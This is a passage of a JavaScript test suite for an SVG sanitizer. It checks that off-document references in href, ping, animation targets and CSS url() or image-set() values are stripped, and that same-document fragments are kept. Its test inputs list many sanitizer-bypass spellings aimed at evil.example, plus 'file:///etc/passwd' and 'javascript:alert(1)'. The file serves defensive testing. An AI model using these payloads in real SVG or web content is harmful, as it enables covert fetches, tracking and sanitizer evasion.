		'\\\\evil.example/x.png', '/\\evil.example/x.png', '\\/evil.example/x.png',
		'  \\\\evil.example/x.png', '\\&#9;\\evil.example/x.png', 'https:\\\\evil.example/x.png'
	]) {
		const result = sanitize(svg('<image href="' + href + '"/><a xlink:href="' + href + '"><path d="M0 0"/></a>'));
		assert.equal(result.error, undefined, href);
		assert.equal(result.refs, 2, href);
		assert.ok(!(/href=/).test(result.text), href);
	}
});

test('an href is an allowlist: a same-document #fragment or a raster data: on an <image>, nothing else', () => {
	/* The browser's URL parser has more ways to name a host than a denylist lists: with a page on http,
	 * `https:evil.test/a.png` and `https:/evil.test/b.png` fetch (the parser ignores the slashes after
	 * a scheme unlike the page's own), and a relative path is a second fetch of its own. */
	for (const href of [
		'https:evil.test/a.png', 'https:/evil.test/b.png', 'HTTPS:evil.test/a.png', 'http:evil.test/a.png',
		'ftp:evil.test/a.png', 'ws:evil.test/a', 'file:///etc/passwd', 'foo:bar', 'mailto:a@b',
		'x.png', './x.png', '../x.png', '/x.png', '\\x.png', 'x/y.png', '?q=1', '', ' ',
		'&#x68;ttps:evil.test/a.png', 'h&#9;ttps:evil.test/a.png', 'https&#10;:evil.test/a.png',
		/* the URL parser strips C0 controls and U+0020 at the ends, and nothing else: JS trim() also
		 * takes NBSP, U+FEFF, U+3000, U+2028, so `<NBSP>data:image/png;/../../x` read as a png data: URL
		 * here and as a relative path (a same-origin fetch of /x) to the browser */
		'&#160;data:image/png;/../../../../x', '&#xFEFF;data:image/png;/../../../../x', '&#x3000;data:image/png;/../../x',
		'&#x2028;data:image/png;/../../x', '&#160;#g', '&#xFEFF;#g', '&#x3000;#g'
	]) {
		for (const attr of [ 'href', 'xlink:href' ]) {
			const result = sanitize(svg('<image ' + attr + '="' + href + '"/><use ' + attr + '="' + href + '"/><path d="M0 0"/>'));
			assert.equal(result.error, undefined, href);
			assert.equal(result.refs, 2, href);
			assert.ok(!(/href=/).test(result.text), href);
		}
	}
	for (const href of [ '#g', '#', '  #g  ', '&#9;#g', '#g&#10;', '&#35;g', '#a.b-c_d', '&#9;&#32;&#10;#g', '#g&#160;' ]) {
		for (const attr of [ 'href', 'xlink:href' ]) {
			const original = svg('<use ' + attr + '="' + href + '"/><a ' + attr + '="' + href + '"><path d="M0 0"/></a>');
			const result = sanitize(original);
			assert.equal(result.error, undefined, href);
			assert.equal(result.text, original, href);
			assert.equal(result.refs, undefined, href);
		}
	}
});

test('an animation that retargets a URL attribute is removed; a safe one survives', () => {
	/* SMIL writes the attribute named by attributeName at run time, so `<animateTransform
	 * attributeName="href">` turns `<a href="#x">` into `translate(<text>)`, a same-origin path
	 * (WebKit follows it on a click). Judged by what it animates, not by its tag name. */
	for (const tag of [ 'animate', 'set', 'animateTransform', 'animateMotion', 'animateColor' ]) {
		for (const name of [ 'href', 'xlink:href', 'ping', 'x:href', ' HREF ', 'xlink:Ping' ]) {
			const result = sanitize(svg('<a href="#x"><path d="M0 0"/></a><' + tag + ' attributeName="' + name + '" to="translate(/../../any)" xmlns:x="urn:x"/>'));
			assert.equal(result.error, undefined, tag + name);
			assert.equal(result.elements, 1, tag + name);
			assert.ok(!(new RegExp('<' + tag, 'i')).test(result.text), tag + name);
			assert.ok(result.text.includes('href="#x"'), tag + name);
		}
	}
	for (const inner of [
		'<animateTransform attributeName="transform" type="rotate" from="0 4 4" to="360 4 4" dur="2s" repeatCount="indefinite"/>',
		'<animate attributeName="fill" values="red;blue" dur="1s"/>', '<set attributeName="opacity" to="0"/>',
		'<animateMotion path="M0 0L8 8" dur="1s"/>', '<animateColor attributeName="fill" from="red" to="blue"/>',
		'<animate attributeName="fill" values="url(#grad);red" dur="1s"/>'
	]) {
		const original = svg('<path d="M0 0">' + inner + '</path>');
		const result = sanitize(original);
		assert.equal(result.text, original, inner);
		assert.equal(result.elements, undefined, inner);
	}
	/* the values/from/to/by are attributes without a namespace: the CSS helper already judges them */
	const hostile = sanitize(svg('<path d="M0 0"><animate attributeName="fill" values="url(http://evil.example/x);red" dur="1s"/></path>'));
	assert.equal(hostile.refs, 1);
	assert.ok(!(/evil\.example/).test(hostile.text));
	assert.ok(hostile.text.includes('<animate attributeName="fill"'));
});

test('ping is a URL-valued attribute: the href allowlist applies to it too', () => {
	/* Chromium POSTs `ping` on a click of the <a>, with no CSP in the way on a direct open. */
	for (const ping of [
		'http://evil.example/t', '//evil.example/t', 'https:evil.example/t', '/t', 't', '', '\\\\evil.example/t',
		'&#160;#g', 'data:text/plain,x', 'javascript:alert(1)', 'http://evil.example/a http://evil.example/b'
	]) {
		const result = sanitize(svg('<a href="#x" ping="' + ping + '"><path d="M0 0"/></a>'));
		assert.equal(result.error, undefined, ping);
		assert.equal(result.refs, 1, ping);
		assert.ok(!(/ping=/).test(result.text), ping);
		assert.ok(result.text.includes('href="#x"'), ping);
	}
	const original = svg('<a href="#x" ping="#x"><path d="M0 0"/></a>');
	assert.equal(sanitize(original).text, original);
});

test('CSS whitespace is space, TAB, LF, CR and FF only: url(<NBSP>#a) is a URL, not a fragment', () => {
	/* `\s` also matches NBSP, U+FEFF and U+3000, so `url(&#160;#a)` read as `#a` here while CSS keeps
	 * the NBSP in the URL, which resolves to /%C2%A0 — a same-origin fetch. */
	for (const sp of [ '&#160;', '&#xFEFF;', '&#x3000;', '&#x2028;' ]) {
		for (const inner of [
			'<style>.a{background:url(' + sp + '#a)}</style>',
			'<style>.a{background:url(' + sp + '"#a")}</style>',
			'<style>.a{background:url("' + sp + '#a")}</style>'
		]) {
			const result = sanitize(svg(inner + '<path d="M0 0"/>'));
			assert.equal(result.elements, 1, inner);
			assert.ok(!(/<style/).test(result.text), inner);
		}
		for (const [ attr, value ] of [ [ 'fill', 'url(' + sp + '#a)' ], [ 'mask', "url('" + sp + "#a')" ], [ 'style', 'fill:url(' + sp + '#a);stroke:#000' ] ]) {
			const result = sanitize(svg('<path ' + attr + '="' + value + '" d="M0 0"/>'));
			assert.equal(result.refs, 1, attr + value);
			assert.ok(!(/#a/).test(result.text), attr + value);
		}
	}
	/* the real CSS whitespace still counts: these are fragments and stay */
	for (const sp of [ ' ', '&#9;', '&#10;', '&#13;', '&#12;' ]) {
		const original = svg('<path fill="url(' + sp + '#a' + sp + ')" d="M0 0"/><style>.a{fill:url(' + sp + '#a)}</style>');
		const result = sanitize(original);
		assert.equal(result.text, original, sp);
	}
});

/* ---- a url( in ANY attribute: fill, stroke, filter, clip-path, mask, marker-*, cursor, … ----
 * A presentation attribute holds a CSS value, so it reaches off the document the way a style
 * declaration does. Measured on Chromium: `<path fill="url(http://host/x)"/>` fetches. */

test('a presentation attribute that reaches off the document is removed, in every spelling', () => {
	for (const [ attr, value ] of [
		[ 'fill', 'url(http://evil.example/x)' ], [ 'fill', 'url(http://evil.example/x#g) red' ],
		[ 'filter', 'url(//evil.example/x#f)' ], [ 'stroke', 'url("https://evil.example/x")' ],
		[ 'clip-path', 'url(x.svg#c)' ], [ 'mask', "url('//evil.example/m')" ], [ 'marker-end', 'url( //evil.example/m )' ],
		[ 'cursor', 'url(evil.example/x.cur), auto' ], [ 'fill', 'URL(//evil.example/x)' ],
		/* image-set() names a file without writing url(); cursor="image-set('http://h/x' 1x)" fetches */
		[ 'cursor', "image-set('//evil.example/c.png' 1x), auto" ], [ 'cursor', 'src("//evil.example/c.png"), auto' ], [ 'fill', 'url (//evil.example/x)' ],
		/* a fragment first does not excuse the second reference */
		[ 'fill', 'url(#g) url(//evil.example/x)' ], [ 'filter', 'url(#a) url(//evil.example/b)' ],
		/* a function is its name directly followed by `(`; an escape in the name does not hide it */
		[ 'cursor', "ima\\67 e-set('//evil.example/c.png' 1x), auto" ], [ 'cursor', '\\73rc("//evil.example/c.png"), auto' ],
		[ 'fill', '-webkit-image-set("//evil.example/c.png" 1x)' ], [ 'cursor', 'cross-fade(#a, "//evil.example/c.png")' ],
		/* hex escapes, a CR LF ending one, and a char reference are resolved before the match */
		[ 'fill', 'u\\72l(//evil.example/x)' ], [ 'fill', '\\75rl(//evil.example/x)' ],
		[ 'fill', 'u\\72&#13;&#10;l(//evil.example/x)' ], [ 'stroke', 'url(\\2f\\2fevil.example/x)' ],
		[ 'fill', '&#117;rl(//evil.example/x)' ],
		/* not only the presentation names: any attribute that carries a CSS value */
		[ 'data-x', 'url(//evil.example/x)' ]
	]) {
		const result = sanitize(svg('<path ' + attr + '="' + value + '" d="M0 0"/>'));
		assert.equal(result.error, undefined, attr + '=' + value);
		assert.equal(result.refs, 1, attr + '=' + value);
		assert.ok(!(/evil\.example|x\.svg/).test(result.text), attr + '=' + value);
		assert.ok(result.text.includes('d="M0 0"'), attr + '=' + value);			/* only the attribute goes */
	}
});

test('a presentation attribute that points into its own document is kept untouched', () => {
	for (const [ attr, value ] of [
		[ 'fill', 'url(#grad)' ], [ 'fill', "url( '#grad' )" ], [ 'fill', 'url(&quot;#grad&quot;) red' ],
		[ 'fill', 'url(#grad)  #fff' ], [ 'filter', 'url(#f)' ], [ 'clip-path', 'url(#c)' ], [ 'mask', 'url(#m)' ],
		[ 'marker-end', 'url(#arrow)' ], [ 'stroke', 'URL(#g)' ], [ 'fill', 'url(#a) url(#b)' ],
		[ 'fill', '#100f0d' ], [ 'transform', 'translate(10 20) rotate(30)' ], [ 'd', 'M0 0 L10 10' ]
	]) {
		const original = svg('<path ' + attr + '="' + value + '" d="M0 0"/>');
		const result = sanitize(original);
		assert.equal(result.error, undefined, attr + '=' + value);
		assert.equal(result.text, original, attr + '=' + value);
		assert.equal(result.refs, undefined, attr + '=' + value);
	}
});

test('a kept raster data: image beside a removed data: link: only the link loses its href', () => {
	const result = sanitize(svg('<image href="' + PNG + '"/><a href="data:text/html,x"><path d="M0 0"/></a>'));
	assert.equal(result.error, undefined);
	assert.equal(result.refs, 1);
	assert.ok(result.text.includes('<image href="' + PNG + '"/>'));
	assert.ok(!(/text\/html/).test(result.text));
});
